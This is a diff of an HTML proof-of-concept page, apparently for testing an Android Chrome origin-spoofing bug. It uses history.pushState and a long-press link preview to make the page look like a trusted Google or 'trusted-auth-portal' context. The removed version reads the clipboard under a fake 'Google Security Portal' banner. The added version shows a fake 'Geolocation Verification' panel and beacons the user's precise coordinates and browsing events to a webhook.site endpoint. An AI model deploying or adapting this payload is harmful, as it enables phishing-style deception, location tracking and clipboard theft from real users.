@@ -1,155 +1,163 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>History PushState & Origin Spoofing PoC</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f8f9fa;
-            color: #202124;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .banner {
-            font-size: 13px;
-            color: #5f6368;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-        }
-        h1 {
-            font-size: 20px;
-            color: #1a73e8;
-            margin-bottom: 24px;
-        }
-        a.spoof-link {
-            display: inline-block;
-            background-color: #1a73e8;
-            color: white;
-            padding: 14px 28px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 15px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
-            transition: background-color 0.2s;
-        }
-        a.spoof-link:active {
-            background-color: #1557b0;
-        }
-        .info-box {
-            margin-top: 25px;
-            max-width: 320px;
-            width: 100%;
-            background: #ffffff;
-            border: 1px solid #dadce0;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-            font-size: 13px;
-            color: #5f6368;
-            word-break: break-all;
-            display: none;
-            text-align: left;
-        }
-        .footer-note {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #9aa0a6;
-        }
-        .pulse {
-            color: #34a853;
-            font-weight: bold;
-            animation: blink 1.5s infinite;
-        }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
-    </style>
+<meta charset="utf-8">
+<title>Android Origin Desync & Preview PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui, Roboto, sans-serif;
+  background: #f5f5f7;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+}
+.spoof-link {
+  display: inline-block;
+  font-size: 16px;
+  padding: 14px 24px;
+  border-radius: 12px;
+  text-decoration: none;
+  background: #1a73e8;
+  color: #fff;
+  font-weight: 600;
+  box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
+}
+#panel {
+  display: none;
+  max-width: 420px;
+  width: 90%;
+  margin-top: 30px;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.15);
+  text-align: center;
+}
+button.action-btn {
+  font-size: 15px;
+  padding: 10px 16px;
+  border-radius: 8px;
+  border: none;
+  background: #34a853;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 12px;
+}
+.notice {
+  margin-top: 14px;
+  font-size: 12px;
+  color: #5f6368;
+}
+</style>
 </head>
+
 <body>
 
-    <div class="banner">Google Security Portal</div>
-    <h1>History PushState & Origin Context</h1>
+<!-- Target Link dengan dukungan Long-Press Preview & PushState Context -->
+<a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="triggerLink">Long Press -> Preview Page & Origin Sync</a>
 
-    <!-- Target Link dengan Preview Page (target="_blank") -->
-    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Origin Injection</a>
+<div id="panel">
+  <h2>Geolocation Verification</h2>
+  <p>Tap below to initialize precise coordinate retrieval.</p>
 
-    <!-- Kotak Informasi Status -->
-    <div class="info-box" id="infoBox">
-        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
-        <div id="originDetails" style="margin-top: 8px;"></div>
-    </div>
+  <button class="action-btn" onclick="getLocation()">Get Location</button>
+  <p id="output" style="margin-top: 12px; font-size: 14px; color: #202124;">Location: -</p>
 
-    <div class="footer-note">Cloud-secured verification system.</div>
+  <div class="notice">
+    Android Chrome security context verification.
+  </div>
+</div>
 
-    <script>
-        // 1. Inisialisasi manipulasi History State saat halaman dimuat
-        try {
-            // Memanipulasi history agar konteks seolah-olah berasal dari path/origin terpercaya
-            const spoofedOriginUrl = "https://accounts.google.com/o/oauth2/auth/identifier";
-            window.history.pushState({ originContext: "auth_secure_gateway" }, "Secure Gateway", spoofedOriginUrl);
-        } catch (e) {
-            // Browser memblokir cross-origin pushState, fallback ke relative/same-origin path spoofing
-            window.history.pushState({ originContext: "auth_secure_gateway" }, "Secure Gateway", "/auth/verify/google.com");
-        }
+<script>
+const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
 
-        // 2. Event listener utama berbasis long-press (contextmenu) dengan jeda waktu 3 detik
-        document.addEventListener("contextmenu", async (e) => {
-            const infoBox = document.getElementById("infoBox");
-            const statusText = document.getElementById("statusText");
-            const originDetails = document.getElementById("originDetails");
+/* 🔥 CORS-proof forensic logger */
+function logEvent(type, extra = {}) {
+  const data = {
+    type,
+    ts: performance.now().toFixed(3),
+    epoch: Date.now(),
+    url: location.href,
+    origin: location.origin,
+    visibility: document.visibilityState,
+    readyState: document.readyState,
+    ...extra
+  };
 
-            infoBox.style.display = "block";
-            statusText.className = "pulse";
-            statusText.innerText = "Injecting history state & triggering payload...";
+  const params = new URLSearchParams(data).toString();
+  new Image().src = `${LOG_ENDPOINT}?${params}`;
+}
 
-            setTimeout(async () => {
-                try {
-                    // Membaca konteks state history yang telah dimanipulasi
-                    const currentState = history.state;
-                    const currentUrl = window.location.href;
+const panel   = document.getElementById('panel');
+const triggerLink = document.getElementById('triggerLink');
+const output  = document.getElementById('output');
 
-                    // Mengambil data Clipboard sebagai bentuk ekstraksi payload lanjutan
-                    let extractedData = "No clipboard access";
-                    if (navigator.clipboard && navigator.clipboard.readText) {
-                        try {
-                            extractedData = await navigator.clipboard.readText();
-                        } catch (err) {
-                            extractedData = "Restricted by browser policy";
-                        }
-                    }
+function getLocation() {
+  if (!navigator.geolocation) return;
 
-                    statusText.className = "";
-                    statusText.innerText = "Origin Context & Payload Executed!";
-                    originDetails.innerHTML = `
-                        <b>Current History URL:</b> ${currentUrl}<br>
-                        <b>Injected State:</b> ${JSON.stringify(currentState)}<br>
-                        <b>Extracted Clipboard:</b> <span style="color: #c5221f;">${extractedData}</span>
-                    `;
+  logEvent("geolocation_requested");
 
-                } catch (err) {
-                    statusText.className = "";
-                    statusText.innerText = `Execution error: ${err.message}`;
-                }
-            }, 3000); // Jeda 3 detik sesuai permintaan Anda
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      logEvent("geolocation_success", {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      });
+
+      output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+    },
+    err => {
+      logEvent("geolocation_error", { code: err.code });
+      output.textContent = 'Permission denied / error';
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+/* Step 1: Android Context Menu / Long Press Integration */
+triggerLink.addEventListener('contextmenu', (e) => {
+  logEvent("poc_started_contextmenu");
+
+  // Memanipulasi history state agar konteks URL tampak terpercaya sebelum preview terbuka
+  try {
+    history.pushState({ trustedContext: true }, '', '/trusted-auth-portal');
+    logEvent("pushstate_done", { newPath: location.pathname });
+  } catch (err) {
+    logEvent("pushstate_error", { message: err.message });
+  }
+
+  // Menampilkan panel interaktif bersamaan dengan jeda waktu render Android Chrome
+  setTimeout(() => {
+    panel.style.display = 'block';
+    logEvent("panel_displayed");
+  }, 400);
+});
+
+triggerLink.addEventListener('touchstart', () => {}, { passive: true });
+
+/* Step 2: Android Navigation Race & State Sync */
+window.addEventListener('pageshow', (event) => {
+  logEvent("pageshow", { persisted: event.persisted });
+
+  // Penyesuaian waktu tunda (delay) agar sesuai dengan siklus render UI thread Android Chrome
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        logEvent("navigation_check", {
+          stateLength: history.length,
+          currentPath: location.pathname
         });
-
-        // 3. Menangkap event popstate untuk memantau perubahan state navigasi riwayat
-        window.addEventListener("popstate", (event) => {
-            console.debug("History state changed:", event.state);
-        });
-    </script>
+      }, 120);
+    });
+  });
+});
+</script>
 
 </body>
 </html>
